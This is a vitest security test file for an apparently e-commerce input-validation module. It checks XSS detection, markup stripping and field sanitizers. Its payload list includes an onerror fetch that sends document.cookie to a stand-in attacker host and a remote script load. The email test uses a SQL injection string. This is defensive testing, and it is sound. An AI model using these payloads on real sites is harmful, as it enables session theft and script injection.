import { describe, it, expect } from 'vitest';
import {
  hasMaliciousContent,
  stripDangerousMarkup,
  sanitizeName,
  isValidName,
  sanitizePhone,
  isValidPhone,
  sanitizeAddress,
  isValidEmail,
} from '../utils/validation';

describe('Penetration & Security Test Suite — Injection Hardening', () => {
  const XSS_PAYLOADS = [
    '<script>alert("PWNED")</script>',
    '<SCRIPT SRC="https://evil.attacker.com/malware.js"></SCRIPT>',
    '<img src="invalid_img" onerror="fetch(\'https://attacker.com/steal?cookie=\' + document.cookie)" />',
    '<svg/onload=alert(1)>',
    '<iframe src="javascript:alert(1)"></iframe>',
    'javascript:void(window.location=\'https://phishing.site\')',
    'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
    '<body onload="alert(\'exploit\')">',
    '"><script>alert(1)</script>',
    '<input type="text" autofocus onfocus="alert(1)">',
  ];

  it('1. DETECTS all standard XSS and script injection attack vectors', () => {
    XSS_PAYLOADS.forEach((payload) => {
      const isDetected = hasMaliciousContent(payload);
      expect(isDetected).toBe(true);
    });
  });

  it('2. NEUTRALIZES and strips malicious tags from input strings', () => {
    XSS_PAYLOADS.forEach((payload) => {
      const stripped = stripDangerousMarkup(payload);
      expect(stripped).not.toContain('<script');
      expect(stripped).not.toContain('<iframe');
      expect(stripped).not.toContain('onerror=');
      expect(stripped).not.toContain('javascript:');
      expect(hasMaliciousContent(stripped)).toBe(false);
    });
  });

  it('3. HARDENS Customer Name field against symbol & code injection', () => {
    const maliciousName = '<script>alert(1)</script> Arjun 12345 !@#$%^&*()';
    const sanitized = sanitizeName(maliciousName);

    // Strips script, digits, and symbols — leaving pure clean alphabetic name
    expect(sanitized).toBe('Arjun');
    expect(isValidName(sanitized)).toBe(true);

    // Direct malicious payloads are strictly invalidated
    expect(isValidName('<script>alert(1)</script>')).toBe(false);
    expect(isValidName('Arjun123')).toBe(false);
    expect(isValidName('Vikram@#$')).toBe(false);
  });

  it('4. HARDENS Phone Number input against alpha & script attacks', () => {
    const maliciousPhone = '+91 98765-43210 <iframe src="evil.com"></iframe>';
    const sanitized = sanitizePhone(maliciousPhone);

    expect(sanitized).toBe('+91 98765-43210 ');
    expect(isValidPhone(sanitized)).toBe(true);
    expect(isValidPhone('invalid')).toBe(false);
    expect(isValidPhone('123')).toBe(false); // too short (<7 digits)
  });

  it('5. GUARDS Address and Shipping inputs against HTML markup', () => {
    const maliciousAddress = 'Apartment 4B, 10th Cross <script>steal()</script>, MG Road';
    const sanitized = sanitizeAddress(maliciousAddress);

    expect(sanitized).not.toContain('<script');
    expect(sanitized).toContain('Apartment 4B, 10th Cross');
    expect(sanitized).toContain('MG Road');
  });

  it('6. GUARDS Email field against SQL injection & header smuggling', () => {
    const sqlInjectionEmail = 'user@example.com\' OR \'1\'=\'1\' --';
    expect(isValidEmail(sqlInjectionEmail)).toBe(false);

    const scriptEmail = '<script>alert(1)</script>@domain.com';
    expect(isValidEmail(scriptEmail)).toBe(false);

    const validEmail = 'vikram.rao@western-ghats.org';
    expect(isValidEmail(validEmail)).toBe(true);
  });

  it('7. WITHSTANDS Buffer Overflow & Large String Fuzzing (100,000 characters)', () => {
    const hugeInput = 'A'.repeat(100000);
    const start = performance.now();
    const result = hasMaliciousContent(hugeInput);
    const duration = performance.now() - start;

    expect(result).toBe(false);
    // Must complete in under 50ms without catastrophic regex backtracking
    expect(duration).toBeLessThan(50);
  });
});
